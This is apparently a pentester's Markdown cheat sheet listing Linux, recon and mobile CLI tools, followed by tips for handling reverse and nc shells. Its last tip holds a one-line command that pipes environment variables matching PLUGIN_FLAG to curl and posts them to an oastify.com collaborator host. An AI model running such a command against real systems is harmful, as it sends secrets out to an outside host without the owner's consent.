## Джентельменский набор

### Modern Linux

- [jq](https://github.com/jqlang/jq) - JSON parser
- [yq](https://github.com/mikefarah/yq) - YAML & CSV parser
- [xq](https://github.com/sibprogrammer/xq) - XML & HTML parser
- [gron](https://github.com/tomnomnom/gron) - JSON grep
- [gf](https://github.com/tomnomnom/gf) - grep wrapper
- [anew](https://github.com/tomnomnom/anew) - add to list if it doesn't contain this item
- [gee](https://github.com/hahwul/gee)- tee with filtering & formatting
- [choose](https://github.com/theryangeary/choose) - human readable awk print
- [lsd](https://github.com/Peltoche/lsd) - ls
- [fd](https://github.com/sharkdp/fd) - find with simplier syntax
- [sd](https://github.com/chmln/sd) - sed
- [cheat](https://github.com/cheat/cheat) - notes 
- [dog](https://github.com/ogham/dog) - dig 
- [pueue](https://github.com/Nukesor/pueue) - background multitasking
- [gef](https://github.com/hugsy/gef) - enhanced gdb
- [tmuxp](https://github.com/tmux-python/tmuxp) - tmux wrapper
- [glow](https://github.com/charmbracelet/glow) - Markup renderer

### Recon

- [concurl](https://github.com/tomnomnom/concurl) - concurrent curl
- [katana](https://github.com/projectdiscovery/katana) - crawler
- [unfulr](https://github.com/tomnomnom/unfurl) - URL parser 
- prips
- [ratelimit](https://github.com/projectdiscovery/ratelimit) - ratelimiting proxy
- [gau](https://github.com/lc/gau) get all cached urls

### Mobile

- [adbe](https://github.com/ashishb/adb-enhanced) - adb wrapper
- [scrcpy](https://github.com/Genymobile/scrcpy) - PC to Android clipboard share
## Невообразимые выкрутасы

Use `script` command to log history from your reverse shells:
```
script filename.out
```
Use [rlwrap](https://github.com/hanslub42/rlwrap) to add some comfort into nc shells.

To safe a process from killing during an accidental closing of the ssh shell you can run it in the screen utility:
```bash
screen -S nmap-scan # initsialize a new screen called nmap-scan
# Ctrl+A D to exit screen
screen -r nmap-scan # dip into previous screen again
```

To pass data into curl directly from stdin:
```bash
env | grep PLUGIN_FLAG | curl -X POST --data-binary @- https://id.oastify.com/oastify
```